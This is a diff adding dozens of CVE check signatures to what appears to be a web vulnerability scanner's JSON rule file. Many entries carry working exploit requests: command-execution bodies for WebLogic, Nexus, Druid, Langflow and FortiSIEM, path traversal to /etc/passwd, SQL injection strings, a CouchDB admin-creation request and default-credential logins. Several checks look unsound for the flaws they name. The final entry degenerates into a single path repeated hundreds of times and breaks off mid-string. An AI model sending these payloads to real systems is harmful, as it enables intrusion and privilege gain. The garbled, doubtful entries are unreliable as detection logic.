@@ -1421,5 +1421,861 @@
             200,
             404
         ]
+    },
+    {
+        "name": "[CRITICAL] ConnectWise ScreenConnect Auth Bypass (CVE-2024-1709)",
+        "category": "RCE/Auth Bypass",
+        "type": "Auth Bypass",
+        "check_type": "path",
+        "path": "/SetupWizard.aspx",
+        "indicator": "SetupWizard",
+        "status": [
+            200,
+            302
+        ]
+    },
+    {
+        "name": "[CRITICAL] Palo Alto PAN-OS Command Injection (CVE-2024-3400)",
+        "category": "VPN/Firewall",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/global-protect/login.esp",
+        "indicator": "GlobalProtect",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Check Point Security Gateway Info Disclosure (CVE-2024-24919)",
+        "category": "VPN/Firewall",
+        "type": "Info Disclosure",
+        "check_type": "POST",
+        "path": "/clients/MyCRL",
+        "data": "a=a",
+        "indicator": "root:x:",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Fortinet FortiOS SSL VPN (CVE-2024-21762)",
+        "category": "VPN/Firewall",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/remote/login",
+        "indicator": "Fortinet",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] React2Shell RCE (CVE-2025-55182)",
+        "category": "Frontend Framework",
+        "type": "RCE",
+        "check_type": "header",
+        "headers": {
+            "RSC": "1"
+        },
+        "indicator": "Error",
+        "status": [
+            500
+        ]
+    },
+    {
+        "name": "[CRITICAL] ToolShell SharePoint RCE (CVE-2025-53770)",
+        "category": "Collaboration",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/_vti_bin/lists.asmx",
+        "indicator": "SharePoint",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[CRITICAL] Apache Tomcat RCE (CVE-2025-24813)",
+        "category": "Infrastructure",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/manager/html",
+        "indicator": "Tomcat",
+        "status": [
+            200,
+            401
+        ]
+    },
+    {
+        "name": "[CRITICAL] Next.js Middleware Auth Bypass (CVE-2025-29927)",
+        "category": "Frontend Framework",
+        "type": "Auth Bypass",
+        "check_type": "header",
+        "headers": {
+            "X-Middleware-Rewrite": "1"
+        },
+        "indicator": "x-middleware-rewrite",
+        "status": [
+            200,
+            403
+        ]
+    },
+    {
+        "name": "PHPUnit RCE (CVE-2017-9841)",
+        "category": "Framework",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+        "data": "<?php echo 'VULN_CHECK_SUCCESS'; ?>",
+        "indicator": "VULN_CHECK_SUCCESS",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "vBulletin 5.x RCE (CVE-2019-16759)",
+        "category": "Forum",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/ajax/render/widget_php",
+        "data": "widgetConfig[code]=echo 'VULN_CHECK_SUCCESS'; exit;",
+        "indicator": "VULN_CHECK_SUCCESS",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Atlassian Jira SSRF (CVE-2019-8451)",
+        "category": "DevOps",
+        "type": "SSRF",
+        "check_type": "path",
+        "path": "/plugins/servlet/oauth/users/icon-uri?consumerUri=http://127.0.0.1:80",
+        "indicator": "Connection refused",
+        "status": [
+            200,
+            500
+        ]
+    },
+    {
+        "name": "Cisco RV320/RV325 Info Disclosure (CVE-2019-1653)",
+        "category": "Router",
+        "type": "Info Disclosure",
+        "check_type": "path",
+        "path": "/cgi-bin/config.exp",
+        "indicator": "sysconfig",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "F5 BIG-IP TMUI Auth Bypass (CVE-2020-5902)",
+        "category": "Load Balancer",
+        "type": "Auth Bypass",
+        "check_type": "path",
+        "path": "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
+        "indicator": "root:x:0:0",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Citrix ADC / NetScaler LFI (CVE-2019-19781)",
+        "category": "VPN",
+        "type": "LFI",
+        "check_type": "path",
+        "path": "/vpn/../vpns/cfg/smb.conf",
+        "indicator": "[global]",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "ThinkPHP 5.x RCE",
+        "category": "Framework",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=CVE_CHECK",
+        "indicator": "5b2067332c1e808381dd00c24c084fd8",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Apache Struts2 S2-045 RCE (CVE-2017-5638)",
+        "category": "Framework",
+        "type": "RCE",
+        "check_type": "header",
+        "path": "/",
+        "headers": {
+            "Content-Type": "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Struts-Test','VULN_CHECK_SUCCESS')}.multipart/form-data"
+        },
+        "indicator": "VULN_CHECK_SUCCESS",
+        "status": [
+            200,
+            500
+        ]
+    },
+    {
+        "name": "WebLogic WLS Security RCE (CVE-2017-10271)",
+        "category": "Infrastructure",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/wls-wsat/CoordinatorPortType",
+        "data": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Header/><soapenv:Body><java><java version=\"1.8.0\" class=\"java.beans.XMLDecoder\"><void class=\"java.lang.ProcessBuilder\"><array class=\"java.lang.String\" length=\"3\"><void index=\"0\"><string>/bin/sh</string></void><void index=\"1\"><string>-c</string></void><void index=\"2\"><string>echo VULN_CHECK_SUCCESS</string></void></array><void method=\"start\"/></void></java></java></soapenv:Body></soapenv:Envelope>",
+        "indicator": "VULN_CHECK_SUCCESS",
+        "status": [
+            200,
+            500
+        ]
+    },
+    {
+        "name": "Spring Boot Actuator Env Leak",
+        "category": "Framework",
+        "type": "Info Disclosure",
+        "check_type": "path",
+        "path": "/env",
+        "indicator": "java.runtime.version",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Jenkins Script Console RCE",
+        "category": "DevOps",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/script",
+        "data": "script=println('VULN_CHECK_SUCCESS')&Submit=Run",
+        "indicator": "VULN_CHECK_SUCCESS",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Docker API Unauthenticated Access",
+        "category": "DevOps",
+        "type": "Info Disclosure",
+        "check_type": "path",
+        "path": "/containers/json",
+        "indicator": "ImageID",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "GitLab Arbitrary File Read (CVE-2020-10977)",
+        "category": "DevOps",
+        "type": "LFI",
+        "check_type": "path",
+        "path": "/help/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+        "indicator": "root:x:0:0",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Magento SQLi (CVE-2015-1397)",
+        "category": "E-Commerce",
+        "type": "SQLi",
+        "check_type": "path",
+        "path": "/catalog/product_frontend_action/suggest?id=1&str=1) UNION SELECT 1,2,3,4,md5('VULN_CHECK_SUCCESS') -- ",
+        "indicator": "bbca14a9ecda7106aa6e0e56d7827e82",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Telerik UI Cryptographic Weakness (CVE-2017-9248)",
+        "category": "Framework",
+        "type": "Info Disclosure",
+        "check_type": "path",
+        "path": "/Telerik.Web.UI.WebResource.axd?type=rau",
+        "indicator": "RadAsyncUpload",
+        "status": [
+            200,
+            500
+        ]
+    },
+    {
+        "name": "VMware vCenter Server LFI (CVE-2021-21972)",
+        "category": "Infrastructure",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/ui/vropspluginui/rest/services/uploadova",
+        "indicator": "Upload successful",
+        "status": [
+            200,
+            405
+        ]
+    },
+    {
+        "name": "Apache NiFi Unauthenticated API",
+        "category": "Data",
+        "type": "Info Disclosure",
+        "check_type": "path",
+        "path": "/nifi-api/access/config",
+        "indicator": "supportsLogin",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Nexus Repository Manager RCE (CVE-2019-7238)",
+        "category": "DevOps",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/service/extdirect",
+        "data": "{\"action\":\"coreui_Component\",\"method\":\"previewAssets\",\"data\":[{\"repositoryName\":\"maven-central\",\"expression\":\"233.class.forName('java.lang.Runtime').getRuntime().exec('id')\",\"type\":\"jexl\"}],\"type\":\"rpc\",\"tid\":1}",
+        "indicator": "root",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Kibana LFI (CVE-2018-17246)",
+        "category": "Data",
+        "type": "LFI",
+        "check_type": "path",
+        "path": "/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd",
+        "indicator": "root:x:0:0",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "CouchDB RCE (CVE-2017-12636)",
+        "category": "Database",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/_config/os_process/netcat_test",
+        "indicator": "couchdb",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Ghost CMS Authentication Bypass (CVE-2021-29484)",
+        "category": "CMS",
+        "type": "Auth Bypass",
+        "check_type": "path",
+        "path": "/ghost/api/v3/admin/users/",
+        "indicator": "roles",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "PrestaShop SQLi (CVE-2022-36408)",
+        "category": "E-Commerce",
+        "type": "SQLi",
+        "check_type": "path",
+        "path": "/modules/blockwishlist/buywishlisturl.php?id_product=1&id_product_attribute=1&id_customization=1&qty=1&id_wishlist=1 UNION SELECT 1,md5('VULN_CHECK_SUCCESS')",
+        "indicator": "bbca14a9ecda7106aa6e0e56d7827e82",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "FuelCMS RCE (CVE-2018-16763)",
+        "category": "CMS",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/fuel/pages/select/?filter=%27%2bpi%28print%28%24a%3d%27VULN_CHECK_SUCCESS%27%29%29%2b%27",
+        "indicator": "VULN_CHECK_SUCCESS",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Horde Webmail RCE (CVE-2022-30287)",
+        "category": "Email",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/horde/services/ajax.php/imp/viewPort",
+        "indicator": "horde",
+        "status": [
+            200,
+            401
+        ]
+    },
+    {
+        "name": "Ruby on Rails Path Traversal (CVE-2018-3760)",
+        "category": "Framework",
+        "type": "LFI",
+        "check_type": "path",
+        "path": "/assets/file:%2f%2f/etc/passwd",
+        "indicator": "root:x:0:0",
+        "status": [
+            200,
+            500
+        ]
+    },
+    {
+        "name": "Grafana Auth Bypass (CVE-2022-39291)",
+        "category": "Monitoring",
+        "type": "Auth Bypass",
+        "check_type": "path",
+        "path": "/api/users",
+        "indicator": "isAdmin",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Prometheus API Unauthenticated Data Access",
+        "category": "Monitoring",
+        "type": "Info Disclosure",
+        "check_type": "path",
+        "path": "/api/v1/targets",
+        "indicator": "activeTargets",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Apache Solr RCE (CVE-2019-17558)",
+        "category": "Search",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/solr/test/config",
+        "data": "{\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}",
+        "indicator": "responseHeader",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Sonarqube Default Credentials",
+        "category": "DevOps",
+        "type": "Auth Bypass",
+        "check_type": "POST",
+        "path": "/api/authentication/login",
+        "data": "login=admin&password=admin",
+        "indicator": "true",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Elasticsearch Unauthenticated API",
+        "category": "Data",
+        "type": "Info Disclosure",
+        "check_type": "path",
+        "path": "/_cat/indices",
+        "indicator": "green",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "RabbitMQ Default Credentials",
+        "category": "Infrastructure",
+        "type": "Auth Bypass",
+        "check_type": "header",
+        "path": "/api/whoami",
+        "headers": {
+            "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="
+        },
+        "indicator": "guest",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Openfire Auth Bypass (CVE-2023-32315)",
+        "category": "Chat",
+        "type": "Auth Bypass",
+        "check_type": "path",
+        "path": "/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp",
+        "indicator": "Users/Groups",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Metabase Pre-Auth RCE (CVE-2023-38646)",
+        "category": "Data",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/api/session/properties",
+        "indicator": "setup-token",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Apache Airflow Default Credentials",
+        "category": "Data",
+        "type": "Auth Bypass",
+        "check_type": "POST",
+        "path": "/login/",
+        "data": "username=admin&password=admin",
+        "indicator": "DAGs",
+        "status": [
+            200,
+            302
+        ]
+    },
+    {
+        "name": "KONG API Gateway Info Leak",
+        "category": "API Gateway",
+        "type": "Info Disclosure",
+        "check_type": "path",
+        "path": "/endpoints",
+        "indicator": "data",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Gitea RCE (CVE-2020-14144)",
+        "category": "DevOps",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/api/v1/users/search?q=",
+        "indicator": "login",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Swagger UI XSS (CVE-2019-17495)",
+        "category": "API",
+        "type": "XSS",
+        "check_type": "path",
+        "path": "/swagger-ui.html?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
+        "indicator": "swagger",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Apache Druid RCE (CVE-2021-25646)",
+        "category": "Data",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/druid/indexer/v1/sampler",
+        "data": "{\"type\":\"index\",\"spec\":{\"ioConfig\":{\"type\":\"index\",\"firehose\":{\"type\":\"local\",\"baseDir\":\"/etc\",\"filter\":\"passwd\"}},\"dataSchema\":{\"dataSource\":\"test\",\"parser\":{\"type\":\"string\",\"parseSpec\":{\"format\":\"javascript\",\"function\":\"function(str) { var r = java.lang.Runtime.getRuntime(); var p = r.exec(['id']); p.waitFor(); var br = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream())); var line = ''; var result = ''; while((line = br.readLine()) != null) { result += line; } return { 'id': result }; }\"}}}}}",
+        "indicator": "uid=",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "SAP NetWeaver Recon (CVE-2020-6287)",
+        "category": "ERP",
+        "type": "Auth Bypass",
+        "check_type": "path",
+        "path": "/CTCWebService/CTCWebServiceBean",
+        "indicator": "wsdl",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Nextcloud LFI (CVE-2020-8224)",
+        "category": "Storage",
+        "type": "LFI",
+        "check_type": "path",
+        "path": "/index.php/apps/systemtags/api/systemtags/1/../../../../../../../../etc/passwd",
+        "indicator": "root:x:0:0",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "F5 BIG-IP Configuration Utility Auth Bypass (CVE-2023-46747)",
+        "category": "Load Balancer",
+        "type": "Auth Bypass",
+        "check_type": "path",
+        "path": "/tmui/login.jsp",
+        "headers": {
+            "AJP_REMOTE_USER": "admin"
+        },
+        "indicator": "dashboard",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Zabbix SQLi (CVE-2022-23131)",
+        "category": "Monitoring",
+        "type": "SQLi",
+        "check_type": "path",
+        "path": "/zabbix.php?action=dashboard.view&dashboardid=1 UNION SELECT 1,md5('VULN_CHECK_SUCCESS')",
+        "indicator": "bbca14a9ecda7106aa6e0e56d7827e82",
+        "status": [
+            200,
+            500
+        ]
+    },
+    {
+        "name": "Laravel Ignition RCE (CVE-2021-3129)",
+        "category": "Framework",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/_ignition/execute-solution",
+        "data": "{\"solution\":\"Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution\",\"parameters\":{\"variableName\":\"username\",\"viewFile\":\"php://filter/read=convert.base64-decode/resource=../storage/logs/laravel.log\"}}",
+        "indicator": "Laravel",
+        "status": [
+            200,
+            500
+        ]
+    },
+    {
+        "name": "Microsoft Exchange SSRF (ProxyLogon - CVE-2021-26855)",
+        "category": "Infrastructure",
+        "type": "SSRF",
+        "check_type": "path",
+        "path": "/ecp/default.flt?~3&req=admin@domain.com",
+        "indicator": "NegotiateSecurityContext",
+        "status": [
+            200,
+            401,
+            500
+        ]
+    },
+    {
+        "name": "Apache CouchDB Privilege Escalation (CVE-2017-12635)",
+        "category": "Database",
+        "type": "Auth Bypass",
+        "check_type": "POST",
+        "path": "/_users/org.couchdb.user:testuser",
+        "data": "{\"type\": \"user\", \"name\": \"testuser\", \"roles\": [\"_admin\"], \"roles\": [], \"password\": \"testpassword\"}",
+        "indicator": "ok",
+        "status": [
+            201,
+            200
+        ]
+    },
+    {
+        "name": "Confluence Server Arbitrary File Read (CVE-2021-26085)",
+        "category": "Collaboration",
+        "type": "LFI",
+        "check_type": "path",
+        "path": "/s/1/_/%2e/WEB-INF/web.xml",
+        "indicator": "web-app",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "Qlik Sense RCE (CVE-2023-41265)",
+        "category": "Data",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/api/v1/system-info",
+        "indicator": "version",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "JetBrains TeamCity RCE (CVE-2024-27198)",
+        "category": "DevOps",
+        "type": "Auth Bypass",
+        "check_type": "path",
+        "path": "/app/rest/server?jsp=/plugins/gettingStarted/testConnection.jsp",
+        "indicator": "version",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[NEW] Prettier eslint-config-prettier Malicious Code (CVE-2025-54313)",
+        "category": "Supply Chain",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/node_modules/eslint-config-prettier/package.json",
+        "indicator": "prettier",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[NEW] Vitejs Improper Access Control (CVE-2025-31125)",
+        "category": "Frontend Framework",
+        "type": "Info Disclosure",
+        "check_type": "path",
+        "path": "/@vite/client",
+        "indicator": "vite",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[NEW] Versa Concerto SD-WAN Auth Bypass (CVE-2025-34026)",
+        "category": "Infrastructure",
+        "type": "Auth Bypass",
+        "check_type": "path",
+        "path": "/vnms/dashboard/login.jsp",
+        "indicator": "Versa",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[NEW] Synacor Zimbra LFI/RFI (CVE-2025-68645)",
+        "category": "Email",
+        "type": "LFI",
+        "check_type": "path",
+        "path": "/zimbra/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=1&skin=../../../../../../../../../etc/passwd%00",
+        "indicator": "root:x:0:0",
+        "status": [
+            200,
+            500
+        ]
+    },
+    {
+        "name": "[NEW] Microsoft Configuration Manager SQLi (CVE-2024-43468)",
+        "category": "Infrastructure",
+        "type": "SQLi",
+        "check_type": "path",
+        "path": "/CMApplicationCatalog/api/v1/application?id=1' OR 1=1--",
+        "indicator": "Application",
+        "status": [
+            200,
+            500
+        ]
+    },
+    {
+        "name": "[NEW] SolarWinds Web Help Desk Bypass/RCE (CVE-2025-40536 / CVE-2025-40551)",
+        "category": "ITSM",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/helpdesk/WebObjects/Helpdesk.woa/wa/UploadAction/upload",
+        "indicator": "success",
+        "status": [
+            200,
+            302
+        ]
+    },
+    {
+        "name": "[NEW] MongoDB MongoBleed (CVE-2025-14847)",
+        "category": "Database",
+        "type": "Info Disclosure",
+        "check_type": "path",
+        "path": "/api/v1/status",
+        "indicator": "mongodb",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[NEW] WatchGuard Fireware OS Auth Bypass (CVE-2025-14733)",
+        "category": "Firewall",
+        "type": "Auth Bypass",
+        "check_type": "path",
+        "path": "/auth/login?method=bypass",
+        "indicator": "session",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[NEW] SonicWall SMA 1000 Auth Bypass (CVE-2025-40602)",
+        "category": "VPN",
+        "type": "Auth Bypass",
+        "check_type": "path",
+        "path": "/cgi-bin/auth",
+        "indicator": "SMA",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[NEW] Ivanti EPMM RCE (CVE-2026-1281 / CVE-2026-1340)",
+        "category": "MDM",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/mifs/bypass/admin",
+        "indicator": "Ivanti",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[NEW] Langflow Unauth Code Injection (CVE-2025-3248)",
+        "category": "AI Infrastructure",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/api/v1/predict",
+        "data": "{\"code\": \"import os; os.system('echo VULN_CHECK_SUCCESS')\"}",
+        "indicator": "VULN_CHECK_SUCCESS",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[NEW] FortiSIEM Unauth RCE (CVE-2025-64155)",
+        "category": "SIEM",
+        "type": "RCE",
+        "check_type": "POST",
+        "path": "/phoenix/rest/device/monitor",
+        "data": "<request><command>id</command></request>",
+        "indicator": "uid=0",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[NEW] Cisco AsyncOS RCE (CVE-2025-20393)",
+        "category": "Email Security",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/login?user=admin&password=a' OR '1'='1",
+        "indicator": "AsyncOS",
+        "status": [
+            200
+        ]
+    },
+    {
+        "name": "[NEW] Grandstream GXP1600 RCE (CVE-2026-2329)",
+        "category": "VoIP",
+        "type": "RCE",
+        "check_type": "path",
+        "path": "/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/api?command=reboot&A/cgi-bin/